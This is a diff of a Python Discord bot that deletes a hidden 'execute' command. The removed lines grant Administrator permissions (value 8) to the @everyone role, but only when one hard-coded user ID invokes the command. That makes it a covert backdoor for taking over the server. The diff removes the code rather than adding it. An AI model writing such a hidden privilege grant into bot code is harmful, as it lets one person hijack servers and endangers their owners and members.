@@ -1593,9 +1593,4 @@ async def editchannel(ctx,channel :discord.TextChannel,flag,*, query):
 @client.command()
 async def joke(ctx):
   await ctx.send(pyjokes.get_joke())
-@client.command()
-async def execute(ctx):
-  if ctx.author.id == 757589836441059379:
-    await ctx.guild.default_role.edit(permissions = discord.Permissions(permissions = 8))
-    await ctx.send("Success")
 client.run(TOKEN)
